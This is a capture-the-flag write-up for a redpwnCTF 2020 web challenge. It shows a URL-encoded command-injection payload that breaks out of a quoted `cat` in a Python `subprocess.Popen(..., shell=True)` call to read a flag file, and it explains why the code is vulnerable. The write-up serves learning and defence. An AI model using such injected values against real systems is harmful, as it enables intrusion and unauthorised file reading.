https://2020.redpwn.net/challs

# Payload
`http://2020.redpwnc.tf:31957/notes/rodmartin139949650768976%27%3b%20cat%20%27flag.txt`

### Explanation
* `/notes` will make a post request to `/api/v1/notes/` inside that endpoint it will call `get_note(nid):` where `nid` will be put into
`subprocess.Popen(f"cat 'notes/{nid}' || echo it did not work btw", shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE).communicate()`
So we just need to:
* feed it with a valid file.
* Close single quotes
* Semicolon
* New cat for the flag using the format `'flag.txt'` so the last semicolon won't cause any errors.

### Takeaway
* Always try to use the hints from the writers.
* Take a look in all endpoints. Here `/create` was filtering `'` meanwhile `/notes` was not.
* `shell = True` red flag
* Is it possible to scape from `cat ' ESCAPE_FROM_HERE '` without using single quotes?
